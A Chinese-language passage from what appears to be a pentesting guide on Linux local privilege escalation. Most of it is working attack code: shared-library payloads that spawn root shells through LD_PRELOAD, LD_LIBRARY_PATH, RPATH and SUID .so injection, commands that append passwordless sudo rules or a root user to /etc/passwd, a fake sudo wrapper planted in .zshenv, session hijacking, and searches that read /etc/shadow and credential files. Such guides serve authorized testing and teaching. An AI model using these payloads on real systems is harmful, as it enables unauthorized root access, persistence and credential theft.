**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so 文件），让加载器在加载其他所有库之前加载它们，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

不过，为了维护系统安全并防止此功能遭到利用，尤其是针对 **suid/sgid** 可执行文件，系统会强制执行以下条件：

- 对于真实用户 ID（_ruid_）与有效用户 ID（_euid_）不匹配的可执行文件，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只会预加载位于标准路径中且本身也带有 suid/sgid 的库。

如果你能够使用 `sudo` 执行命令，并且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD** 语句，就可能发生权限提升。此配置会允许 **LD_PRELOAD** 环境变量保留，并在通过 `sudo` 运行命令时继续生效，从而可能以提升后的权限执行任意代码。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

保存为 **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

然后使用以下命令**编译它**：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最后，运行 **escalate privileges**.

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** 环境变量，就可以滥用类似的 privesc，因为他能够控制搜索库的路径。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID 二进制文件 – .so 注入

遇到权限设置为 **SUID** 且看起来异常的二进制文件时，最好确认它是否正确加载 **.so** 文件。可以运行以下命令进行检查：<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明可能存在可利用的机会。

要利用这一点，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

此代码在编译并执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。

使用以下命令将上述 C 文件编译为共享对象（.so）文件：

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最后，运行受影响的 SUID 二进制文件应会触发 exploit，可能导致系统被攻陷。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

现在我们已经找到一个从我们可写目录加载 library 的 SUID binary，接下来就在该目录中创建一个名称符合要求的 library：

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

如果你遇到类似这样的错误，

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

这意味着你生成的 library 需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精选的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 类似，但适用于**只能注入参数**的情况。

该项目收集了 Unix 二进制文件的合法功能，攻击者可以滥用这些功能逃离受限 shell、提升或维持更高权限、传输文件、生成 bind 和 reverse shell，以及协助完成其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 检查它能否找到利用任何 sudo 规则的方法。

### Reusing Sudo Tokens

如果你有 **sudo 访问权限**，但没有密码，可以通过**等待 sudo 命令执行，然后劫持会话令牌**来提升权限。<sup>[[18]](#references)</sup>

提升权限所需条件：

- 你已经以用户 "_sampleuser_" 的身份获得一个 shell
- "_sampleuser_" 在**最近 15 分钟内使用过 `sudo`**（默认情况下，sudo token 的有效期为 15 分钟，在此期间可以使用 `sudo` 而无需输入密码）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的结果为 0
- 可以访问 `gdb`（你也可以上传它）

（你可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或者永久修改 `/etc/sysctl.d/10-ptrace.conf`，并将 `kernel.yama.ptrace_scope = 0` 设为配置值。）

如果满足所有这些条件，**你可以使用以下工具提升权限：**[**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **第一个 exploit**（`exploit.sh`）会在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。你可以用它**在当前会话中激活 sudo token**（不会自动获得 root shell，需要执行 `sudo su`）：

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **第二个 exploit**（`exploit_v2.sh`）会在 _/tmp_ 中创建一个**由 root 拥有且设置了 setuid 的** sh shell。

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **第三个 exploit**（`exploit_v3.sh`）会**创建一个 sudoers 文件**，使 **sudo token 永久有效，并允许所有用户使用 sudo**。

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其中任何已创建的文件有**写入权限**，就可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)为用户和 PID **创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且有一个以该用户身份运行、PID 为 1234 的 shell，就可以**获得 sudo 权限**，而无需知道密码：

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 目录中的文件用于配置谁可以使用 `sudo` 以及如何使用。默认情况下，这些文件**只能由 root 用户和 root 组读取**。\
**如果**你可以**读取**此文件，就可能**获得一些有趣的信息**；如果你可以**写入**任何文件，就能够**提升权限**。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

如果你能写入，就能滥用此权限

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

滥用这些权限的另一种方法：

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

有一些 `sudo` 二进制文件的替代方案，例如 OpenBSD 的 `doas`。记得检查其配置文件 `/etc/doas.conf`。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

如果 `doas` 允许使用编辑器或解释器，请检查 GTFOBins 风格的逃逸技巧：

```bash
doas vim
:!/bin/sh
```

一条可获得 root 权限的 `doas` 规则也值得检查原始 Python 版 `dstat` 的插件路径。其[手册](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)和[源代码](https://github.com/dstat-real/dstat/blob/master/dstat)列出了 `/usr/share/dstat/` 和 `/usr/local/share/dstat/`，作为 `dstat_*.py` 插件的存放位置。如果当前用户可以写入并搜索已安装版本实际使用的位置，选定的插件就可能以 `doas` 的 RunAs 身份运行。请确认有效规则、该版本中的插件查找方式、目录和上级目录的权限或 ACL，以及调用者是否能选择插件；仅有 `dstat` 规则或可写目录只能作为线索。其他 `dstat` 实现可能使用不同的插件系统。请被动检查元数据，不要加载插件。

### Sudo Hijacking

如果你知道**某个用户通常会连接到一台机器，并使用 `sudo`**来提升权限，而你又在该用户上下文中获得了 shell，就可以**创建一个新的 sudo 可执行文件**，先以 root 身份执行你的代码，再执行该用户的命令。然后，**修改该用户上下文中的 $PATH**（例如，在 .bash_profile 中添加新路径），这样用户执行 sudo 时就会运行你的 sudo 可执行文件。

请注意，如果用户使用的是其他 shell（不是 bash），你就需要修改其他文件来添加新路径。例如，[sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你还可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似下面的命令：

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指明**已加载的配置文件来自哪里**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。这些配置文件**指向其他文件夹**，系统会在这些文件夹中**搜索** **libraries**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索 libraries**。

如果由于某种原因，**某个用户对**以下任意路径拥有写权限：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任何文件，或 `/etc/ld.so.conf.d/*.conf` 配置文件中指定的任何文件夹，该用户可能就能提升权限。\
请查看以下页面，了解**如何利用此配置错误**：


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

通过将该库复制到 `/var/tmp/flag15/`，程序便会按照 `RPATH` 变量的指定使用此处的库。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

然后使用以下命令在 `/var/tmp` 中创建一个恶意库：

`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities 为进程提供**一部分可用的 root 权限**。这实际上将 root **权限拆分成更小且彼此独立的单元**。随后可以将这些单元分别授予进程。这样可以减少完整权限集，从而降低被利用的风险。\
阅读以下页面，**详细了解 capabilities 及其滥用方法**：


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**“execute”位**表示受影响的用户可以使用“**cd**”进入该文件夹。\
**“read”位**表示用户可以**列出**其中的**文件**，而 **“write”位**表示用户可以**删除**和**创建**新的**文件**。

## ACLs

访问控制列表（ACL）是自主权限控制的第二层，可**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝特定用户（他们既不是文件所有者，也不属于相应用户组）访问文件或目录，增强了访问控制能力。这种**细粒度控制可实现更精确的访问管理**。更多详情请见[**此处**](https://linuxconfig.org/how-to-manage-acls-on-linux)。<sup>[[19]](#references)</sup>

为用户 “kali” **授予**对某个文件的读写权限：

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**获取**系统中具有特定 ACL 的文件：

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-ins 中隐藏的 ACL 后门

一种常见的错误配置是：`/etc/sudoers.d/` 中由 root 所有、权限模式为 `440` 的文件，仍通过 ACL 向低权限用户授予写入权限。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

如果你看到类似 `user:alice:rw-` 的内容，即使文件模式位限制严格，该用户仍可追加一条 sudo 规则：

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

由于在仅使用 `ls -l` 检查时很容易忽略，这是一条影响很大的 ACL 持久化/提权路径。

## 打开的 shell 会话

跨用户访问 GNU Screen 取决于**正在运行的会话配置和 ACL**，而不只是其版本。[GNU Screen 文档](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html)说明，GNU Screen 必须在构建时启用 multiuser 支持；设置 `multiuser on`，并通过 `acladd` 或适当的 `aclchg` 授权，才能允许其他用户 attach。[手册还要求设置 setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)，以进行跨用户会话查找。仅看到由 root 拥有的 socket 或 SUID `screen` 二进制文件，并不能证明存在可 attach 的 root shell。在将其视为提权途径之前，请确认当前会话启用了 multiuser、当前用户拥有有效的输入/命令权限，并且该会话中的 shell 以特权用户身份运行。

### screen sessions hijacking

**列出 screen 会话**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket 位置（某些系统会将其中一个作为另一个的符号链接暴露）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**附加到会话**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

这是 **旧版 tmux** 中存在的问题。作为非特权用户，我无法 hijack 由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![套接字位置（某些系统会将其中一个作为另一个的符号链接公开）- tmux sessions hijacking：tmux -S /tmp/dev sess ls 使用该套接字列出会话；你可以在该套接字上启动 tmux 会话……](<../../images/image (837).png>)

**附加到会话**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

查看 **HTB 的 Valentine box** 作为示例。

## SSH

### Debian OpenSSL 可预测 PRNG - CVE-2008-0166

在历史漏洞期间，使用受影响的 Debian 或衍生版本 OpenSSL 构建生成的密钥，可能具有可预测的随机性；主机当前的发行版或已修补的 OpenSSL 版本，并不能说明旧密钥是如何生成的。请使用合适的历史黑名单检查**具体密钥**及其来源。Debian 的 [`ssh-vulnkey` 手册](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html)介绍了如何检查公钥和 `authorized_keys`；[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1)记录了 OpenSSL 修复情况。只有在能够找回与特权账户 `authorized_keys` 条目相匹配的私钥，且有效 SSH 策略仍允许该账户使用此密钥时，该条目才是提权线索；弱 **host** key 本身并不是登录凭据。请更换已泄露的密钥，并移除旧授权。

### SSH 有趣的配置值

- **PasswordAuthentication:** 指定是否允许密码身份验证。上游 OpenSSH 默认值为 `yes`；发行版配置可能会覆盖此值。
- **PubkeyAuthentication:** 指定是否允许公钥身份验证。默认值为 `yes`。
- **PermitEmptyPasswords**: 在允许密码身份验证时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### 登录控制文件

这些文件会影响谁可以登录以及登录方式：

- **`/etc/nologin`**：如果存在，则阻止非 root 用户登录，并显示其中的信息。
- **`/etc/securetty`**：限制 root 可以从哪些位置登录（TTY 允许列表）。
- **`/etc/motd`**：登录后的横幅（可能会 leak 环境或维护详情）。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录。上游 OpenSSH 默认值为 `prohibit-password`；发行版配置可能会覆盖此值。可能的值：

- `yes`：root 可以使用密码和私钥登录
- `without-password` 或 `prohibit-password`：root 只能使用私钥登录
- `forced-commands-only`：Root 只能使用私钥登录，且必须指定 commands 选项
- `no`：不允许

### 受信任的 SSH 用户证书颁发机构

`TrustedUserCAKeys` 指定 sshd 信任其签发**用户**证书的公钥。如果低权限用户可以读取对应的 CA 私钥，请检查哪些人可以获取证书，以及证书可以用于以哪些账户 principal 进行身份验证。`AuthorizedPrincipalsFile` 或 `AuthorizedPrincipalsCommand` 可以限制接受的名称；如果两者均未配置，证书必须包含目标账户名。`PermitRootLogin prohibit-password` 会阻止 root 密码身份验证，但仍可能允许证书身份验证。仅凭暴露的密钥路径无法证明可以访问：请确认公钥/私钥对、有效的 `Match` 规则、账户策略、密钥口令、吊销状态以及接受的签名算法。枚举输出中不要包含私钥字节。请参阅 [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys)。

如果有权限委派规则允许当前用户以密钥所有者的身份调用不受限制的[证书签名工具，例如 `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s)，那么即使当前用户无法读取私钥，也可能使用该私钥。请结合检查确切允许的命令及参数、签名账户对密钥的访问权限、有效 sshd 配置所信任的公共 CA、目标账户接受的 principal、证书有效期以及该账户的登录策略。仅有委派的签名命令或受信任的 CA 文件，并不能证明可以访问其他账户；被动枚举时不要签发测试证书。

关于单独的每账户 CA 信任路径，请参阅 [SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion)。

### AuthorizedKeysFile

指定包含可用于用户身份验证的公钥的文件。它可以包含 `%h` 之类的令牌，该令牌会被替换为主目录。**可以指定绝对路径**（以 `/` 开头），也可以指定**相对于用户主目录的路径**。例如：

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

该配置表示，如果你尝试使用用户“**testusername**”的**私钥**登录，ssh 会将你的密钥中的公钥与 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的公钥进行比对。

### ForwardAgent/AllowAgentForwarding

SSH agent 转发允许你**使用本地 SSH 密钥，而不必将密钥（无口令！）留在服务器上**。这样，你就可以通过 ssh **跳转到一台主机**，再从那里**使用**位于**初始主机**上的**密钥**跳转到另一台主机。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下所示：

```
Host example.com
  ForwardAgent yes
```

注意，如果 `Host` 每次都是 `*`，那么用户每次跳转到不同机器时，该主机都能访问这些密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以**覆盖**这些**选项**，并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认允许）。

如果你发现某个环境中配置了 Forward Agent，请阅读以下页面，因为**你或许可以滥用它来提升权限**：


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profile 文件

文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是**用户启动新 shell 时执行的脚本**。因此，如果你能**写入或修改其中任何文件，就可以提升权限**。

```bash
ls -l /etc/profile /etc/profile.d/
```

如果发现任何奇怪的 profile 脚本，应检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此，建议**查找所有这些文件**，并**检查是否可以读取**，以查看文件中**是否包含哈希值**：

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

有时可以在 `/etc/passwd`（或等效文件）中找到**密码哈希**。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 可写的 /etc/passwd

首先，使用以下命令之一生成密码。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

然后添加用户 hacker，并设置生成的密码。

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在可以使用 `su` 命令，并输入 `hacker:hacker`

或者，可以使用以下几行添加一个没有密码的虚拟用户。\
警告：这可能会降低当前系统的安全性。

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注意：在 BSD 平台中，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd` 中，`/etc/shadow` 也会更名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某个**服务配置文件**？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

例如，如果机器正在运行 **tomcat** 服务器，并且你可以 **修改 /etc/systemd/ 中的 Tomcat 服务配置文件，**那么你可以修改以下几行：

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

你的 backdoor 将在下次启动 tomcat 时执行。

### 检查目录

以下目录可能包含备份或有价值的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（你可能无法读取最后一个目录，但可以试试）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 异常位置/属主文件

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 最近几分钟内修改的文件

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite 数据库文件

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

对于可读的应用数据库，检查表名和列名，查找用户名和密码哈希。找到哈希、还原其密码，以及证明该密码被本地账户重复使用，是彼此独立的步骤；仅凭一个通用的 32 位十六进制字符串，不足以推断它是 MD5 哈希或证明能够访问账户。

### \*\_history、.sudo_as_admin_successful、profile、bashrc、httpd.conf、.plan、.htpasswd、.git-credentials、.rhosts、hosts.equiv、Dockerfile、docker-compose.yml 文件

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

如果可读的 shell history 中有一条 `sudo` 命令，后面紧跟一行看起来像密码的短文本，请手动检查周围的行。在正常的 `sudo` 提示符中输入的密码不会保存到 shell history；后续那一行只是可能误输入到 shell 中的内容，并不能证明它是有效密码。`.sudo_as_admin_successful` 标记记录的是之前使用过 `sudo`，而不是当前拥有授权。

### 隐藏文件

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH 中的脚本/二进制文件**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web 文件**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **备份**

检查备份目录中可读的文件，以及**名称**中包含 `backup` 的文件：名称不透明或扩展名表示已加密的归档文件，仍可能暴露旧的应用程序数据。加密归档文件只是潜在的暴露点。恢复密码、检查其内容、恢复应用程序哈希，以及将该密码用于 Unix 账户，都是需要分别验证的步骤；归档文件中的哈希并不能证明可以本地登录。

可读的虚拟机备份也值得同样检查。VirtualBox `.vbox` 配置文件可以指出所附的 `.vdi` 镜像，并包含加密磁盘密钥元数据；[VirtualBox 文档说明，加密数据密钥存储在虚拟机配置中](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)。只有在配置文件和镜像都可访问时，才能进行离线磁盘检查。来宾卷可能还具有单独的 [LUKS 加密层](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)，需要另一个密钥。即使经授权解密后，旧脚本或配置中仍可能包含密码；在将其认定为本地提权之前，应确认该凭据当前可用于主机账户，并且该账户生效的 `sudo` 策略允许执行特权命令。在被动枚举期间，只盘点路径和权限，不要复制、解密或挂载镜像。

检查可读归档文件时，先列出成员名称，再提取任何内容：即使当前使用的副本受到保护，归档中仍可能存在隐藏的身份验证器文件、恢复码材料或 SSH 密钥。文件名只能提供线索；应分别验证相关材料及账户凭据是否被复用。

优先检查备份目录中**由其他用户拥有的可读归档文件**，尤其是 root 拥有的归档文件，以及可通过组成员身份访问的归档文件。即使当前使用的副本受到保护，旧归档仍可能包含配置或身份验证密钥。对于 [Backrest](https://garethgeorge.github.io/backrest/) 这类本地备份 UI，应检查服务的有效账户，以及低权限用户能否读取其配置或通过 UI 进行身份验证。其 [hooks](https://garethgeorge.github.io/backrest/docs/hooks) 和 [restic 命令接口](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) 可以使用守护进程的文件和命令权限；仅监听 loopback 并不能决定其影响。Backrest 的 `passwordBcrypt` 是其[身份验证代码](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)中的 base64 编码 bcrypt 哈希，并非明文密码。在将暴露的归档文件或 UI 视为权限边界之前，应确认服务身份、凭据是否可用，以及是否能访问相关计划或仓库。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### 已知的包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**多个可能包含密码的文件**。\
**另一个有用的工具**是 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，可用于检索存储在 Windows、Linux 和 Mac 本地计算机上的大量密码。

如果 `/etc/guacamole/guacamole.properties` 可读，请检查其中的 `mysql-*`、`postgresql-*` 或 `sqlserver-*` 数据库连接设置。如果该账户有权读取 Guacamole JDBC 表，`guacamole_connection_parameter` 可能包含已保存的 SSH `username`、`password`、`private-key` 或 `passphrase` 值。先查看连接 ID 和参数名称，再检查相关行；已保存的值可能是动态 token 或 vault 引用，而不是可重复使用的 secret。请参阅 [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) 和 [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)。

[pswm 密码管理器](https://github.com/Julynx/pswm#usage) 默认会在 `~/.local/share/pswm/pswm` 保存加密的 vault。如果能看到其他用户的 vault，请检查其所有权，以及你的账户是否确实有权读取。仅凭 vault 路径无法得知凭据；找回其主密码、发现可重复使用的账户密码，以及确认该账户的权限，是彼此独立的步骤。

